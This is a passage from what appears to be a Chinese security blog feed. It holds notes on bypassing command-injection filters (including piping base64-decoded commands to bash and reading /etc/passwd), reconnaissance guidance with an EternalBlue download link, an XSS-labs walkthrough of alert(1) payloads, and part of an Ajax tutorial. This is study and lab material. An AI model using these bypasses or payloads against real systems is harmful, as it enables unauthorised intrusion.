class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span>/flag</code></pre></div><h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符"></a>重定向字符</h3><blockquote><p>&lt; ,&lt;&gt;</p></blockquote><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>&lt;&gt;flag</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>&lt;flag</code></pre></div><h3 id="09绕过-Tab-键"><a href="#09绕过-Tab-键" class="headerlink" title="%09绕过 - Tab 键"></a>%09绕过 - Tab 键</h3><blockquote><p>url编码，get方式使用</p></blockquote><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>%09flag</code></pre></div><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="?? , * 绕过"></a>?? , * 绕过</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl??</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl* 如果有多个匹配结果则同时输出</code></pre></div><h3 id="单双引号，反引号绕过"><a href="#单双引号，反引号绕过" class="headerlink" title="单双引号，反引号绕过"></a>单双引号，反引号绕过</h3><div class="code-wrapper"><pre><code class="hljs bash">c<span class="hljs-string">&quot;&quot;</span>at /e<span class="hljs-string">&#x27;t&#x27;</span>c/pas``s``wd</code></pre></div><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl\ag</code></pre></div><h3 id="特殊变量-1-9"><a href="#特殊变量-1-9" class="headerlink" title="特殊变量 $1-$9 $@ $*"></a>特殊变量 $1-$9 $@ $*</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fa<span class="hljs-variable">$1ag</span></code></pre></div><h3 id="内联执行绕过"><a href="#内联执行绕过" class="headerlink" title="内联执行绕过"></a>内联执行绕过</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$a</span>=fl;<span class="hljs-variable">$b</span>=ag;<span class="hljs-built_in">cat</span> $a<span class="hljs-variable">$b</span></code></pre></div><h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><ul><li>先查看环境变量</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span></code></pre></div><ul><li>系统输出一堆</li></ul><div class="code-wrapper"><pre><code class="hljs ruby">/usr/local/<span class="hljs-symbol">sbin:</span>/usr/local/<span class="hljs-symbol">bin:</span>/usr/<span class="hljs-symbol">sbin:</span>/usr/<span class="hljs-symbol">bin:</span>/<span class="hljs-symbol">sbin:</span>/<span class="hljs-symbol">bin:</span>/usr/<span class="hljs-symbol">games:</span>/usr/local/<span class="hljs-symbol">games:</span>/usr/lib/wsl/<span class="hljs-symbol">lib:</span>/mnt/c/<span class="hljs-title class_">Program</span> <span class="hljs-title class_">Files</span>/<span class="hljs-title class_">Common</span> <span class="hljs-title class_">Files</span>/<span class="hljs-title class_">Oracle</span>/<span class="hljs-title class_">Java</span>/<span class="hljs-symbol">javapath:</span>/mnt/c/<span class="hljs-title class_">Windows</span>/<span class="hljs-symbol">system32:</span>/mnt/c/<span class="hljs-title class_">Windows</span><span class="hljs-symbol">:/mnt/c/Windows/System32/Wbem</span><span class="hljs-symbol">:/mnt/c/Windows/System32/WindowsPowerShell/v1</span>.<span class="hljs-number">0</span>/<span class="hljs-symbol">:/mnt/c/Windows/System32/OpenSSH/</span><span class="hljs-symbol">:/mnt/c/Program</span> <span class="hljs-title class_">Files</span>/<span class="hljs-variable constant_">NVIDIA</span> <span class="hljs-title class_">Corporation</span>/<span class="hljs-variable constant_">NVIDIA</span> <span class="hljs-title class_">Nv</span><span class="hljs-symbol">DLISR:</span>/mnt/c/<span class="hljs-title class_">Program</span> <span class="hljs-title class_">Files</span> (x86)/<span class="hljs-variable constant_">NVIDIA</span> <span class="hljs-title class_">Corporation</span>/<span class="hljs-title class_">Phys</span>X/<span class="hljs-title class_">Common</span><span class="hljs-symbol">:/mnt/c/Program</span> <span class="hljs-title class_">Files</span>/<span class="hljs-title class_">Bandizip</span>/<span class="hljs-symbol">:/mnt/c/Tools/MISC/steghide</span><span class="hljs-symbol">:/mnt/c/Program</span> <span class="hljs-title class_">Files</span>/<span class="hljs-title class_">Git</span>/<span class="hljs-symbol">cmd:</span>/mnt/c/phpstudy_pro/<span class="hljs-title class_">Extensions</span>/<span class="hljs-title class_">MySQL5</span>.<span class="hljs-number">7.26</span>/bin/<span class="hljs-symbol">:/mnt/c/Tools/MISC/Stegdetect</span><span class="hljs-symbol">:/mnt/c/Tools/PWN/checksec</span><span class="hljs-symbol">:/mnt/c/Program</span> <span class="hljs-title class_">Files</span>/<span class="hljs-title class_">Wireshark</span><span class="hljs-symbol">:/mnt/c/Program</span> <span class="hljs-title class_">Files</span>/nodejs/<span class="hljs-symbol">:/mnt/c/Users/Lixiney/scoop/shims</span><span class="hljs-symbol">:/mnt/c/Users/Lixiney/AppData/Local/Microsoft/WindowsApps</span><span class="hljs-symbol">:/mnt/c/Tools/Ciphey-</span><span class="hljs-number">5.14</span>.<span class="hljs-number">0</span><span class="hljs-symbol">:/mnt/c/Users/Lixiney/AppData/Local/Programs/Microsoft</span> <span class="hljs-variable constant_">VS</span> <span class="hljs-title class_">Code</span>/<span class="hljs-symbol">bin:</span>/mnt/c/<span class="hljs-title class_">Program</span> <span class="hljs-title class_">Files</span>/<span class="hljs-title class_">JetBrains</span>/<span class="hljs-title class_">PyCharm</span> <span class="hljs-number">2024.1</span>/<span class="hljs-symbol">bin:</span>/mnt/c/<span class="hljs-title class_">Program</span> <span class="hljs-title class_">Files</span>/<span class="hljs-title class_">JetBrains</span>/<span class="hljs-title class_">CLion</span> <span class="hljs-number">2023.3</span>.<span class="hljs-number">4</span>/<span class="hljs-symbol">bin:</span>/mnt/c/<span class="hljs-title class_">Users</span>/<span class="hljs-title class_">Lixiney</span>/<span class="hljs-title class_">AppData</span>/<span class="hljs-title class_">Roaming</span>/npm</code></pre></div><ul><li>再执行</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f<span class="hljs-variable">$&#123;PATH:5:1&#125;</span><span class="hljs-variable">$&#123;PATH:8:1&#125;</span><span class="hljs-variable">$&#123;PATH:66:1&#125;</span></code></pre></div><blockquote><p>${PATH:5:1} 表示取路径的第五位，从0开始，步长为1</p></blockquote><h2 id="其他常见绕过方式"><a href="#其他常见绕过方式" class="headerlink" title="其他常见绕过方式"></a>其他常见绕过方式</h2><h3 id="base64-编码"><a href="#base64-编码" class="headerlink" title="base64 编码"></a>base64 编码</h3><ul><li>先将要执行的命令通过base64编码</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag --&gt; Y2F0IGZsYWc=</code></pre></div><ul><li>将base64编码输出出来 通过管道符解密执行，有几种方式</li></ul> <div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span> | <span class="hljs-built_in">base64</span> -d`</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|<span class="hljs-built_in">base64</span> -d)</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> Y2F0IGZsYWc= | <span class="hljs-built_in">base64</span> -d | sh</code></pre></div><h3 id="base32-编码"><a href="#base32-编码" class="headerlink" title="base32 编码"></a>base32 编码</h3><p>同base64编码</p><h3 id="其他编码"><a href="#其他编码" class="headerlink" title="其他编码"></a>其他编码</h3><p>同上</p><h2 id="读取命令绕过-cat"><a href="#读取命令绕过-cat" class="headerlink" title="读取命令绕过 cat"></a>读取命令绕过 cat</h2><p>可以使用下面的命令替换</p><ul><li>tac 反向显示，从最后一行开始读取</li><li>more </li><li>less</li><li>tail  查看末尾几行</li><li>nl  显示行号</li><li>od 以二进制形式读取文件</li><li>sort</li><li>uniq</li><li>strings</li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全-信息收集</title>
    <link href="/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p><em>知己知彼，百战不殆</em></p><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><ul><li><p>得到注册人的信息</p><p>​    邮箱</p><p>​    电话号码</p><p>​    姓名</p></li></ul><p><em>有的站长喜欢拿自己的姓名的拼音设置为密码，这样我们收集到信息之后可以生成一本字典，对网站的后台进行爆破</em></p><table><thead><tr><th>whois网站</th><th>whois.com</th></tr></thead><tbody><tr><td>站长之家</td><td><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></td></tr></tbody></table><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><ul><li>谷歌语法<ul><li>site: 指定域名</li></ul></li><li>在线平台<ul><li>ip反查域名<ul><li><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></li><li><a href="https://reverseip.domaintools.com/">https://reverseip.domaintools.com/</a></li></ul></li><li>微步社区<ul><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li></ul></li><li>站长工具<ul><li><a href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a></li></ul></li><li>潮汐指纹<ul><li><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></li></ul></li></ul></li><li>使用工具爆破DNS服务器<ul><li>Python<ul><li>subDomainsBrute<ul><li><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li></ul></li></ul></li><li>exe工具<ul><li>Layer.exe</li></ul></li></ul></li><li>网页内蜘蛛爬虫<ul><li>等待后续…..</li></ul></li></ul><h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><table><thead><tr><th>语法</th><th>含义</th></tr></thead><tbody><tr><td>site:</td><td>指定站点，查找子域名</td></tr><tr><td>filetype：</td><td>指定文件的格式</td></tr><tr><td>inurl:</td><td>指定存在于url链接里面的字符串</td></tr><tr><td>intext:</td><td>指定存在于网页之中的内容</td></tr><tr><td>intitle:</td><td>指定存在于网页<title></title>标签之中的内容</td></tr><tr><td>allintitle:</td><td>用法和intitle相似可以指定多个词</td></tr><tr><td>allinurl:</td><td>和inurl相似 可以指定多个词</td></tr><tr><td>link:</td><td>将返回所有包含指向 指定链接 的网页</td></tr><tr><td>related:</td><td>返回和指定网页布局相似的网页</td></tr><tr><td>cache:</td><td>网页快照</td></tr><tr><td>info:</td><td>返回站点的指定信息</td></tr><tr><td>define:</td><td>返回某个词语的定义</td></tr></tbody></table><p>举个栗子</p><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p><em>危险端口可以直接爆破入侵，一个ip可能搭建了多个网站，分布在不同的端口</em></p><p>常用的端口探测方法:</p><ul><li>nmap工具<a href="https://nmap.org/">https://nmap.org/</a>  </li><li>在线工具               <a href="https://tool.chinaz.com/port/">https://tool.chinaz.com/port/</a>   &#x2F;&#x2F;站长之家</li></ul><h4 id="Nmap使用方法"><a href="#Nmap使用方法" class="headerlink" title="Nmap使用方法"></a>Nmap使用方法</h4><table><thead><tr><th>基础命令</th><th>功能</th></tr></thead><tbody><tr><td>-p</td><td>指定端口扫描</td></tr><tr><td>-v</td><td>显示扫描过程</td></tr><tr><td>-Pn</td><td>跳过主机发现过程直接端口扫描 [目标禁Ping时]</td></tr><tr><td>-O</td><td>探测主机操作系统</td></tr><tr><td>-A</td><td>全面扫描包括一切探测</td></tr></tbody></table><ul><li>端口扫描状态<ul><li>Opend    端口开放</li><li>Closed    端口关闭</li><li>Filtered   端口被过滤</li></ul></li><li>利用永恒之蓝直接拿下服务器<ul><li>链接： <a href="https://pan.baidu.com/s/1m5F-7vLC3lpVYOcNcIpLwA">https://pan.baidu.com/s/1m5F-7vLC3lpVYOcNcIpLwA</a> </li><li>提取码：zkaq</li></ul></li></ul><h3 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h3><p>旁站指的是同一台服务器上还有其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在服务器上是否还有其他网站。如果有其他网站，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后自然就可以拿下网站了</p><ul><li>在线工具<ul><li><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></li><li><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li></ul></li></ul><h3 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h3><p>C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器</p><ul><li>可以使用在线工具，如fofa<ul><li><a href="https://fofa.info/">https://fofa.info</a></li></ul></li></ul><h4 id="FoFa使用查C段"><a href="#FoFa使用查C段" class="headerlink" title="FoFa使用查C段"></a>FoFa使用查C段</h4><div class="code-wrapper"><pre><code class="hljs abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;[ip地址]/24&quot;</span></code></pre></div><p>注：如果单纯的输入 ip&#x3D;”[ip地址]”  则会搜索该ip开放的端口</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul><li>御剑扫描</li><li>君子协议robots.txt  </li><li>大部分网站都会有，防止网络爬虫乱爬用的 *</li></ul><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p><em>再此引入一种概念，有些网站为了节省开发的时间，他们会套用一种模板（CMS），将安装程序放到服务器上直接运行，安装程序会自动将网站搭建好，但是CMS并非绝对安全，相反，一旦模板爆出漏洞，那么使用这种模板搭建的网站都会存在这种漏洞，即所谓的 ”通杀漏洞“</em></p><p>CMS的种类数不胜数，所以指纹识别可以快速分析出该网站是那种CMS</p><ul><li><p>网站源码</p></li><li><p>有些CMS会写在源码里面或者可以从一些标志中判断</p></li><li><p>在线工具</p><ul><li>whatweb <a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></li><li>微步社区 <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li>潮汐指纹 <a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></li></ul></li><li><p>浏览器插件</p><ul><li>wappalyzer</li></ul></li></ul><h3 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h3><p><code>伪静态是相对真实静态来讲的，真实静态会生成一个html或htm后缀的文件，访客能够访问到真实存在的静态页面，而伪静态则没有生成实体静态页面文件，而仅仅是以.html一类的静态页面形式，但其实是用PHP程序动态脚本来处理的，这就是伪静态。</code></p><p>判断是否是伪静态：</p><ul><li><p>在控制台窗口中输入</p><ul><li><div class="code-wrapper"><pre><code class="language-javascript">javascript:alert(document.lastModified)</code></pre></div><p>如果网站是个html,但是显示的却是现在的时间，就是伪静态页面</p><p><img src="/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240903184446288.png" alt="image-20240903184446288"></p></li></ul></li></ul><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>内容分发网络（CDN）是指一组分布在不同地理位置的服务器，协同工作以提供互联网内容的快速交付。</p><p>也就是说 CDN 不负责承载任何内容</p><p>比如说百度，只有一个，但是从全国各地来访问，他的ip是不一样的。</p><p>使用多地 ping 或者 国外 ping</p><h4 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h4><p><a href="https://www.cnblogs.com/0x7e/p/13710650.html">绕过CDN查找真实IP的方法 - 0X7e - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS-labs通关文档</title>
    <link href="/XSS-labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/"/>
    <url>/XSS-labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文档仅用于信息防御技术研究探讨，请勿用于其他用如图，渗透测试务必在已授权的情况下进行</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><p>使用docker安装</p></blockquote><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker pull vulfocus/xss-labs</code></pre></div><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run -dt --name xss -p 7777:80 vulfocus/xss-labs</code></pre></div><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><blockquote><p>get方式提交数据，在url栏</p></blockquote><p>payload:</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><blockquote><p>输入的数据在提交之后保留在 imput 框中，可以用事件触发</p></blockquote><div class="code-wrapper"><pre><code class="hljs html">&quot; onclick=&quot;alert(1)&quot; /</code></pre></div><h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><blockquote><p>查看页面源代码发现 value 的值用单引号，所以使用单引号闭合</p></blockquote><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-string">&#x27; onclick=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&#x27; /</span></span></code></pre></div><h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><blockquote><p>查看页面源代码发现 value 使用双引号，用双引号闭合</p></blockquote><div class="code-wrapper"><pre><code class="hljs 1c"><span class="hljs-string">&quot; onclick=&quot;</span>alert<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-string">&quot; /</span></code></pre></div><h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><blockquote><p>敏感字符串过滤，比如on 改为 o_n，使用a标签+伪协议触发</p></blockquote><div class="code-wrapper"><pre><code class="hljs html">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>asd<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre></div><h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><blockquote><p>在文本框输入 onclick 发现on被改为o_n ，从大小写方向入手，使用 OnCliCk 发现没有被过滤</p></blockquote><div class="code-wrapper"><pre><code class="hljs html">&quot; OnCLiCk=&quot;alert(1)&quot; /</code></pre></div><h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><blockquote><p>使用上一个关卡的 payload ，发现on被过滤掉，尝试双写绕过 oonn</p></blockquote><div class="code-wrapper"><pre><code class="hljs html">&quot; oonnclick=&quot;alert(1)&quot; /</code></pre></div><h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><blockquote><p>dom 型xss注入</p><p>尝试添加友情链接 <a href="https://www.baidu.com/">https://www.baidu.com</a> 发现，被添加到了下面的a标签中</p><p>尝试插入一段伪协议，但是直接使用会被过滤，需要转换一下编码格式，使用unicode编码</p></blockquote><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span></code></pre></div><h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><blockquote><p>会判断输入的数据中有没有 http:&#x2F;&#x2F; 这个字符串，所以在上一步的基础上后面加上注释即可</p></blockquote><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span>/*http://*/</code></pre></div><h2 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h2><blockquote><p>审查页面元素，发现当前页面有三个imput框属性被设为了隐藏，同时URL栏有三个参数，向三个变量传参，发现最后一个参数保留在框中，可以构建行内js代码</p></blockquote><div class="code-wrapper"><pre><code class="hljs html">&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot; /</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ajax技术-前后端交互</title>
    <link href="/Ajax%E6%8A%80%E6%9C%AF-%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/"/>
    <url>/Ajax%E6%8A%80%E6%9C%AF-%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Ajax 并不是一门编程语言，而是一种前后端交互的技术</p></blockquote><h1 id="什么是-Ajax"><a href="#什么是-Ajax" class="headerlink" title="什么是 Ajax"></a>什么是 Ajax</h1><p>通过在后台与服务器进行少量数据交换，Ajax 可以使用网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p><h1 id="Ajax-实例"><a href="#Ajax-实例" class="headerlink" title="Ajax 实例"></a>Ajax 实例</h1><div class="code-wrapper"><pre><code class="hljs php">&lt;script&gt;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadXMlDoc</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// Ajax 脚本执行</span>&#125;&lt;/script&gt;</code></pre></div><h2 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a>XMLHttpRequest 对象</h2><p>所有现代浏览器均支持 XMLHttpRequest 对象</p><p>XMLHttpRequest 用于在后台与服务器进行数据交换</p><h2 id="创建-XMLHttpRequest-对象"><a href="#创建-XMLHttpRequest-对象" class="headerlink" title="创建 XMLHttpRequest 对象"></a>创建 XMLHttpRequest 对象</h2><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</code></pre></div><h2 id="Ajax-向服务器发出请求"><a href="#Ajax-向服务器发出请求" class="headerlink" title="Ajax 向服务器发出请求"></a>Ajax 向服务器发出请求</h2><div class="code-wrapper"><pre><code class="hljs javascript">xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-literal">true</span>);xmlhttp.<span class="hljs-title function_">send</span>();</code></pre></div><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li>open(method,url,async)<ul><li>method：请求的类型 GET 或 POST</li><li>url ： 文件在服务器上的位置</li><li>async：true（异步）或 false （同步）</li></ul></li><li>send(string)<ul><li>string 仅用于 POST 请求</li></ul></li></ul><h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><div class="code-wrapper"><pre><code class="hljs javascript">xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;test.php?id=1&quot;</span>,<span class="hljs-literal">true</span>);xmlhttp.<span class="hljs-title function_">send</span>();</code></pre></div><h3 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST <strong>请求</strong></h3><div class="code-wrapper"><pre><code class="hljs javascript">xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;test.php&quot;</span>,<span class="hljs-literal">true</span>);xmlhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);xmlhttp.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;name=lixiney&amp;password=hello&quot;</span>);</code></pre></div><ul><li>setRequestHeader(header,value)<ul><li>header 请求头</li><li>请求头的值</li></ul></li></ul><h3 id="Async-true"><a href="#Async-true" class="headerlink" title="Async&#x3D;true"></a>Async&#x3D;true</h3><p>当 async &#x3D; true 时</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">loadXMLDoc</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">        <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><span class="language-javascript">        xmlhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">            <span class="hljs-keyword">if</span>(xmlhttp.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; xmlhttp.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>)&#123;</span><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;myDiv&quot;</span>).<span class="hljs-property">innerHTML</span>=xmlhttp.<span class="hljs-property">responseText</span>;</span><span class="language-javascript">            &#125;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;test.php&quot;</span>,<span class="hljs-literal">true</span>);</span><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">send</span>();</span><span class="language-javascript">    &#125;</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><h2 id="Ajax-服务器的响应"><a href="#Ajax-服务器的响应" class="headerlink" title="Ajax 服务器的响应"></a>Ajax 服务器的响应</h2><h3 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h3><ul><li>responseText<ul><li>获得字符串形式的响应数据</li></ul></li><li>responseXML<ul><li>获得XML形式的响应数据</li></ul></li></ul><h2 id="Ajax-onreadystatechange-事件"><a href="#Ajax-onreadystatechange-事件" class="headerlink" title="Ajax - onreadystatechange 事件"></a>Ajax - onreadystatechange 事件</h2><p>当请求被发送到服务器时，我们需要执行基于响应的任务。</p><p>每当 readyState 改变时，就会出发 onreadystatechange 事件。</p><ul><li>readyState 属性存有 XMLHttpRequest 的状态信息<ul><li>0 :  请求未初始化</li><li>1：服务器连接已建立</li><li>2：请求已接收</li><li>3：请求处理中</li><li>4：请求已完成，且响应就绪</li></ul></li><li>status <ul><li>200 : OK</li><li>404：未找到页面</li><li>其他状态码： <a 